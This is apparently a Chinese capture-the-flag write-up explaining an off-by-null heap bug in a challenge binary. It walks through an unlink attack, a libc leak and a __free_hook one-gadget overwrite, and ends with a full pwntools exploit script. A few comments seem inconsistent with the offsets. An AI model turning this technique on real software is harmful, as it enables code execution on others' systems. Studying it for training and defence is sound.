# 漏洞成因
## 程序关键结构体
程序在bss段维护以下关键数据：
- `heap`：一个指针数组，起始地址为`0x6020E0`，每个元素8字节，存储`malloc`返回的堆块指针，最大索引为`0x20`（即32）。
- `len`：一个整数数组，起始地址为`0x602060`，每个元素4字节，存储对应堆块的大小。
- `key2`：位于`0x6022B8`，控制`show`函数的使用，初始为0，非零时可用。
- `key1`：位于`0x6022BC`，控制`edit`函数的使用次数，初始为0，当`key1`等于2时，`edit`不可用。

结构体伪代码：
```c
struct {
    void* heap[0x21];  // 索引从0到0x20，实际使用索引0、1、31、32等
    int len[0x21];     // 对应堆块的大小
    // ... 其他变量
    int key2;          // 0x6022B8
    int key1;          // 0x6022BC
} global_data;
```

## 漏洞定位
漏洞位于`ed()`函数中的off-by-null：
```c
v2[read(0, v2, (int)len[v1])] = 0;
```
当读取的字节数等于`len[v1]`时，会在末尾写入一个空字节，覆盖相邻堆块`size`字段的最低字节，从而可能修改堆块大小或状态，进而触发堆合并操作。

# 漏洞利用过程：
利用off-by-null漏洞，构造fake chunk，触发unlink攻击，修改`heap`数组指针，进而覆盖`key1`和`key2`，启用`show`函数泄露libc地址，最后通过修改`__free_hook`为onegadget获取shell。

- Step 1: 分配四个堆块，为unlink做准备。
- Step 2: 在chunk32中构造fake chunk，利用off-by-null修改chunk1的size字段。
- Step 3: 释放chunk1，触发unlink，使`heap[32]`指向`heap[29]`的地址。
- Step 4: 通过编辑chunk32，覆盖`heap`数组和`key1`、`key2`，启用`show`函数。
- Step 5: 使用`show`函数泄露`free`函数的got表地址，计算libc基址。
- Step 6: 计算onegadget和`__free_hook`的地址。
- Step 7: 编辑chunk31，修改`heap[32]`指向`__free_hook`。
- Step 8: 编辑chunk32，将onegadget写入`__free_hook`。
- Step 9: 释放chunk0，触发`__free_hook`执行，获取shell。

## Step 1
分配四个堆块：`malloc(0,0xf8,'aaaa')`、`malloc(32,0xf8,'bbbb')`、`malloc(1,0xf8,'cccc')`、`malloc(31,0xf8,'dddd')`。

内存变化：
- 堆内存中分配了四个大小为0x100（包括元数据）的堆块。例如，chunk0位于`0x17a7a010`，内容为`"aaaa"`；chunk32位于`0x17a7a110`，内容为`"bbbb"`；chunk1位于`0x17a7a210`，内容为`"cccc"`；chunk31位于`0x17a7a310`，内容为`"dddd"`。
- bss段的`heap`数组：`heap[0]`指向chunk0地址（如`0x17a7a010`），`heap[32]`指向chunk32地址（如`0x17a7a110`），`heap[1]`指向chunk1地址，`heap[31]`指向chunk31地址。
- `len`数组：`len[0]`、`len[32]`、`len[1]`、`len[31]`均被设置为`0xf8`。

## Step 2
构造payload并编辑chunk32：
```python
free_got = elf.got['free']
ptr = 0x6021E0  # heap[32]的地址
FD = ptr - 24
BK = ptr - 16
py = p64(0) + p64(0xf1) + p64(FD) + p64(BK)
py = py.ljust(0xf0, b'\x00')
py += p64(0xf0)
edit(32, py)
```
内存变化：
- chunk32（位于`0x17a7a110`）的内容被修改，构造了一个fake chunk。fake chunk的`size`为`0xf1`，`fd`和`bk`分别指向`0x6021C8`和`0x6021D0`（即`ptr-24`和`ptr-16`），以满足unlink检查。
- off-by-null漏洞将chunk1的`size`字段从`0x101`修改为`0x100`，即将`PREV_INUSE`位清零，标记前一个堆块（fake chunk）为free状态。

## Step 3
释放chunk1：`free(1)`。

内存变化：
- 由于chunk1认为前一个堆块是free的，会触发向前合并，执行unlink操作。
- unlink操作将`heap[32]`的值修改为`0x6021C8`，即`heap[29]`的地址（因为`0x6021C8 = 0x6020E0 + 29*8`）。
- chunk1被释放，其指针`heap[1]`被清零（来自`free`函数中的清空操作）。

从调试记录Step 3可见，bss地址`0x6021E0`（`heap[32]`）从`0`变为`0x6021C8`。

## Step 4
编辑chunk32，覆盖`heap`数组和`key1`、`key2`：
```python
py = p64(0x6021E0)*3 + p64(free_got) + b'a'*0xD0 + p64(1)
edit(32, py)
```
内存变化：
- 此时`heap[32]`指向`0x6021C8`（`heap[29]`的地址），因此编辑索引32实际是从`heap[29]`开始写入数据。
- `heap[29]`、`heap[30]`、`heap[31]`被覆盖为`0x6021E0`（即`heap[32]`的地址），`heap[32]`被覆盖为`free_got`地址（如`0x602018`）。
- 填充`0xD0`字节的`'a'`后，从`heap[29]`开始累计写入`0xF0`字节，到达`key2`（`0x6022B8`）。随后写入`p64(1)`（小端序为`0x0100000000000000`），将`key2`覆盖为`1`，`key1`覆盖为`0`。
- 现在`show`函数可用（`key2=1`），`edit`函数还可使用两次（`key1=0`）。

## Step 5
使用`show`函数泄露`free`的got表地址：`puts(32)`。

内存变化：
- 程序打印`heap[32]`指向的内容，即`free_got`地址处的值，也就是`free`函数在libc中的地址（如`0x74ea3f3e7780`）。
- 没有直接内存修改，但获取了泄露的地址，用于后续计算。

## Step 6
计算libc基址、onegadget和`__free_hook`地址：
```python
free_addr = u64(leak_data)  # 从Step 5获取
libc_base = free_addr - libc.symbols['free']
onegadget = libc_base + 0x4526a  # 示例偏移，实际需根据libc版本调整
free_hook = libc_base + libc.symbols['__free_hook']
```

## Step 7
编辑chunk31，修改`heap[32]`指向`__free_hook`：
```python
pay = p64(free_hook)
pay = pay.ljust(0xf0, b'\x00')
pay += p64(1)
edit(31, pay)
```
内存变化：
- 在Step 4后，`heap[31]`被覆盖为`0x6021E0`（`heap[32]`的地址），因此编辑索引31实际是向`heap[32]`的地址写入数据。
- 上述payload将`heap[32]`的值修改为`__free_hook`的地址（如`0x74ea3f4ad7a8`），同时再次写入`p64(1)`以保持`key2=1`（防止`key1`被修改影响`edit`可用性）。
- 从调试记录Step 7可见，bss地址`0x6021E0`从`0x6021C8`变为`__free_hook`地址。

## Step 8
编辑chunk32，将onegadget写入`__free_hook`：`edit(32, p64(onegadget))`。

内存变化：
- 此时`heap[32]`指向`__free_hook`，因此编辑操作将onegadget的地址写入`__free_hook`。
- `__free_hook`被覆盖为onegadget地址，后续调用`free`时将执行onegadget。

## Step 9
释放chunk0：`free(0)`。

内存变化：
- 调用`free`函数时，触发`__free_hook`，执行onegadget，获取shell。

# Exploit：
```python
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
elf = ELF('./pwn1')
libc = elf.libc  # 本地环境，使用附带的libc
p = process('./pwn1')

def edit(index, content):
    p.recvuntil("show")
    p.sendline('3')
    p.recvuntil("index:")
    p.sendline(str(index))
    p.recvuntil("content:")
    p.send(content)

def free(index):
    p.recvuntil("show")
    p.sendline('2')
    p.recvuntil("index:")
    p.sendline(str(index))

def malloc(index, size, content):
    p.recvuntil("show")
    p.sendline('1')
    p.recvuntil("index:")
    p.sendline(str(index))
    p.recvuntil("size:")
    p.sendline(str(size))
    p.recvuntil("content:")
    p.send(content)

def puts(index):
    p.recvuntil("show")
    p.sendline('4')
    p.recvuntil("index:")
    p.sendline(str(index))

# Step 1: 分配堆块
malloc(0, 0xf8, 'aaaa')
malloc(32, 0xf8, 'bbbb')
malloc(1, 0xf8, 'cccc')
malloc(31, 0xf8, 'dddd')

# Step 2: 构造fake chunk，利用off-by-null
free_got = elf.got['free']
ptr = 0x6021E0  # heap[32]的bss地址
FD = ptr - 24
BK = ptr - 16
py = p64(0) + p64(0xf1) + p64(FD) + p64(BK)
py = py.ljust(0xf0, b'\x00')
py += p64(0xf0)  # 修改chunk1的prev_size，与fake chunk大小一致
edit(32, py)

# Step 3: 释放chunk1，触发unlink
free(1)

# Step 4: 覆盖heap数组和key1、key2
py = p64(0x6021E0)*3 + p64(free_got)  # 覆盖heap[29]~heap[32]
py += b'a' * 0xD0  # 填充到key2
py += p64(1)  # 覆盖key2为1，key1为0
edit(32, py)

# Step 5: 泄露free的got地址
puts(32)
free_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
log.success("free_addr: " + hex(free_addr))

# Step 6: 计算关键地址
libc_base = free_addr - libc.symbols['free']
onegadget = libc_base + 0x4526a  # 适用于libc 2.23的onegadget偏移
free_hook = libc_base + libc.symbols['__free_hook']
log.success("libc_base: " + hex(libc_base))
log.success("onegadget: " + hex(onegadget))
log.success("free_hook: " + hex(free_hook))

# Step 7: 修改heap[32]指向__free_hook
pay = p64(free_hook)
pay = pay.ljust(0xf0, b'\x00')
pay += p64(1)  # 保持key2=1
edit(31, pay)

# Step 8: 向__free_hook写入onegadget
edit(32, p64(onegadget))

# Step 9: 触发__free_hook
free(0)

p.interactive()
```
